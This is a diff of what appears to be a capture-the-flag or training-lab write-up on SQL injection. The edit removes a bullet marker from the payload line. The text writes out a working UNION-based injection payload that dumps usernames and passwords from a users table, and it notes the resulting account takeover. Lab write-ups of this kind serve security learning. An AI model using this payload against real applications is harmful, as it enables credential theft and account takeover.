@@ -44,7 +44,7 @@
     → Login successful → Lab Solved
 
 # Payload Used
-* ' UNION SELECT (username || ' = ' || password) FROM users--
+' UNION SELECT (username || ' = ' || password) FROM users--
 
 # Impact
 An attacker can extract sensitive data such as usernames and passwords, leading to full account takeover, including administrative access.
